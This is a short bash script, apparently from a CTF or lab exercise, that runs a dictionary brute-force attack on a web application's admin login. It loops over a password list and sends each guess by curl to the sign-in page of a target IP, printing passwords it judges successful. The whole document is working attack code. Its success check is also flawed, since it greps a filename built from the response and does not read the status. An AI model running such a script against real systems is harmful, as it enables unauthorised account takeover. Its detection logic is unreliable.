#!/bin/bash

if [ -z "$1" ]
then
    echo "must pass in the vm ip as argument";
    exit 1;
fi

for password in $(cat dictionnary); do
    headers=$(curl "http://$1/index.php?page=signin&username=admin&password=${password}&Login=Login#")
    if grep '200' "$headers" > /dev/null; then
        echo "$password"
    fi
done
